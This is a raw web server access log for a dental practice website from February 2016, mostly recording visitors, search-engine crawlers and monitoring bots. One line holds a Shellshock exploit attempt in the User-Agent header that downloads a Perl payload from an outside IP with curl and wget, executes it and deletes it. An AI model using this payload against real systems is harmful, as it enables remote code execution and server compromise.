172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET / HTTP/1.1" 200 38156 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /css/bootstrap-theme.css HTTP/1.1" 200 19156 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /css/font-awesome.css HTTP/1.1" 200 28747 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /js/ie-emulation-modes-warning.js HTTP/1.1" 200 2132 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /css/bootstrap.css HTTP/1.1" 200 138415 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /js/bootstrap.min.js HTTP/1.1" 200 35601 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:37 -0800] "GET /js/docs.min.js HTTP/1.1" 200 43299 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
172.56.3.244 - - [09/Feb/2016:13:23:38 -0800] "GET /img/offer-31-05-2014-new-patient.jpg HTTP/1.1" 200 15365 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" "www.superior-dentistry.com"
40.77.167.57 - - [09/Feb/2016:13:35:45 -0800] "GET /Bowie-Dentists/images/meetdr2.png HTTP/1.1" 200 61340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.superior-dentistry.com"
40.77.167.57 - - [09/Feb/2016:13:36:56 -0800] "GET /firstvisit.html HTTP/1.1" 200 24042 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.superior-dentistry.com"
40.77.167.57 - - [09/Feb/2016:13:36:56 -0800] "GET /images/white_composite_filling.jpg HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.superior-dentistry.com"
65.36.241.48 - - [09/Feb/2016:13:38:27 -0800] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.superior-dentistry.com"
192.0.86.127 - - [09/Feb/2016:13:40:36 -0800] "GET /images/care2.jpg HTTP/1.1" 404 89 "-" "Photon/1.0" "www.superior-dentistry.com"
157.55.39.40 - - [09/Feb/2016:13:47:16 -0800] "GET /img/office-slider1.jpg HTTP/1.1" 200 134555 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.superior-dentistry.com"
207.46.13.100 - - [09/Feb/2016:13:48:45 -0800] "GET /images/rating-back.png HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.superior-dentistry.com"
172.246.104.194 - - [09/Feb/2016:14:15:47 -0800] "GET /hello HTTP/1.1" 404 89 "-" "() { :;}; /bin/bash -c \"cd /tmp;curl -O http://67.222.138.236/fax.iso;wget http://67.222.138.236/fax.iso;perl /tmp/fax.iso;perl fax.iso;rm -rf /tmp/fax.iso*\"" "superior-dentistry.com"
66.249.66.89 - - [09/Feb/2016:14:17:35 -0800] "GET /img/extraction.jpg HTTP/1.1" 200 30135 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET / HTTP/1.1" 200 38156 "https://www.google.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /css/bootstrap-theme.css HTTP/1.1" 200 19156 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /css/font-awesome.css HTTP/1.1" 200 28747 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/dental-implants.jpg HTTP/1.1" 200 22844 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /css/bootstrap.css HTTP/1.1" 200 138415 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/logo.jpg HTTP/1.1" 200 139628 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/tmj-trauma.jpg HTTP/1.1" 200 22488 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /js/bootstrap.min.js HTTP/1.1" 200 35601 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/slider1.jpg HTTP/1.1" 200 268888 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/slider3.jpg HTTP/1.1" 200 217901 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /img/zocdoc-apt.jpg HTTP/1.1" 200 79396 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
73.163.15.44 - - [09/Feb/2016:14:25:25 -0800] "GET /fonts/fontawesome-webfont.woff?v=4.3.0 HTTP/1.1" 200 71508 "http://www.superior-dentistry.com/" "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" "www.superior-dentistry.com"
66.249.66.20 - - [09/Feb/2016:14:31:18 -0800] "GET /img/oral-pathology.jpg HTTP/1.1" 200 33395 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
66.249.66.89 - - [09/Feb/2016:14:37:28 -0800] "GET /img/invisalign.jpg HTTP/1.1" 200 142640 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
199.59.148.211 - - [09/Feb/2016:14:45:13 -0800] "GET /images/logo1.jpg HTTP/1.1" 404 89 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
45.121.30.230 - - [09/Feb/2016:14:48:54 -0800] "GET / HTTP/1.1" 200 38156 "http://www.superior-dentistry.com" "IBrowse/2.2 (Windows 3.1)" "www.superior-dentistry.com"
66.249.66.94 - - [09/Feb/2016:14:57:42 -0800] "GET /img/porcelain-veneers.jpg HTTP/1.1" 200 151567 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
66.249.66.92 - - [09/Feb/2016:15:01:31 -0800] "GET /Bowie-Dentists/images/care4.jpg HTTP/1.1" 200 357042 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
66.249.66.89 - - [09/Feb/2016:15:15:19 -0800] "GET /img/Teeth-Whitening1.jpg HTTP/1.1" 200 150063 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
208.122.6.102 - - [09/Feb/2016:15:22:42 -0800] "GET / HTTP/1.1" 200 38156 "-" "FreeWebMonitoring SiteChecker/0.2 (+http://www.freewebmonitoring.com/bot.html)" "www.superior-dentistry.com"
66.249.66.94 - - [09/Feb/2016:15:28:32 -0800] "GET /Bowie-Dentists/images/care5.jpg HTTP/1.1" 200 330601 "-" "Googlebot-Image/1.0" "www.superior-dentistry.com"
178.255.215.79 - - [09/Feb/2016:15:43:57 -0800] "GET /robots.txt HTTP/1.1" 200 49 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)" "www.superior-dentistry.com"
178.255.215.79 - - [09/Feb/2016:15:43:57 -0800] "GET / HTTP/1.1" 200 38156 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)" "www.superior-dentistry.com"
